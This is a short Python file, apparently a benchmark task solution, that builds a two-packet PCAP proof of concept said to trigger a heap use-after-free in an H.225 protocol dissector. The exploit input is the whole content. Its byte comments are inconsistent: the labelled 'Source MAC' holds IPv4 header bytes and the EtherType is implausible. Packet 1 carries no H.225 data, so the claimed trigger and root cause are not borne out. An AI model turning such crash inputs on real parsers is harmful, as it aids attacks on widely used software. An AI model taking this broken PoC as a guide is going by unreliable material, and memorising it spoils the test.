import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
        vulnerability in the h225 dissector.

        The vulnerability occurs because the dissector's state, particularly
        the `next_tvb` reassembly context, is not re-initialized between packets.
        This PoC constructs a minimal PCAP file with two packets:
        1. The first packet is a malformed Ethernet frame that puts the dissector
           into a state where it expects more data, allocating memory for reassembly.
           This memory is freed when processing of the first packet finishes.
        2. The second packet is empty. When the dissector attempts to process it,
           it reuses the stale (and now freed) state from the first packet,
           leading to a use-after-free.

        The structure and content are based on the minimized test case from the
        vulnerability report, resulting in a 73-byte PoC.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input as a PCAP file.
        """
        
        # PCAP Global Header (24 bytes): little-endian, Ethernet link type
        pcap_global_header = struct.pack(
            "<IHHiIII",
            0xa1b2c3d4,  # magic_number
            2,           # version_major
            4,           # version_minor
            0,           # thiszone
            0,           # sigfigs
            65535,       # snaplen
            1            # network (LINKTYPE_ETHERNET)
        )

        # Packet 1 Header (16 bytes): specifies a 17-byte data payload
        packet1_len = 17
        pcap_packet_header1 = struct.pack(
            "<IIII",
            0,             # ts_sec
            0,             # ts_usec
            packet1_len,   # incl_len
            packet1_len    # orig_len
        )

        # Packet 1 Data (17 bytes): malformed Ethernet frame to set up vulnerable state
        packet1_data = (
            b'\x00\x11\x22\x33\x44\x55'  # Destination MAC
            b'\x66\x77\x08\x00\x45\x00'  # Source MAC
            b'\x00\x01'                  # EtherType
            b'\x00\x00\x03'              # Payload
        )

        # Packet 2 Header (16 bytes): an empty packet to trigger the UAF
        pcap_packet_header2 = struct.pack(
            "<IIII",
            0,             # ts_sec
            1,             # ts_usec (slightly later timestamp)
            0,             # incl_len
            0              # orig_len
        )

        # Assemble the final PoC. Packet 2 has no data.
        # Total size: 24 + 16 + 17 + 16 = 73 bytes
        poc = pcap_global_header + pcap_packet_header1 + packet1_data + pcap_packet_header2
        
        return poc